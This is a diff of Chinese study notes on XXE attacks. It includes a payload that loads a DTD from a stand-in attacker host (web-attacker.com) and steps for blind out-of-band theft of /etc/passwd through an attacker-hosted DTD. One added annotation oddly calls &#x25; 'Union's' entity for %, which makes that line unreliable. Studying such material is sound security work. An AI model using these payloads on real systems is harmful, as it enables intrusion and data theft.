@@ -151,7 +151,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ```xml
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
 ```
-
+==注意这里参数实体的引用位置，在html标签是不会生效的==
 #### 3.3 利用盲 XXE 带外窃取数据
 
 通过盲 XXE 漏洞窃取敏感数据，需要攻击者在自己控制的系统上托管一个恶意 DTD，然后从带内 XXE payload 中调用该外部 DTD。
@@ -164,7 +164,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 %eval;
 %exfiltrate;
 ```
-
+==&#x25;是Union的HTML实体编码代表的含义是%==
 执行步骤：
 1. 定义 XML 参数实体 `file`，包含 `/etc/passwd` 的内容
 2. 定义 XML 参数实体 `eval`，包含另一个参数实体 `exfiltrate` 的动态声明。`exfiltrate` 实体将向攻击者服务器发起 HTTP 请求，URL 查询字符串中包含 `file` 实体的值
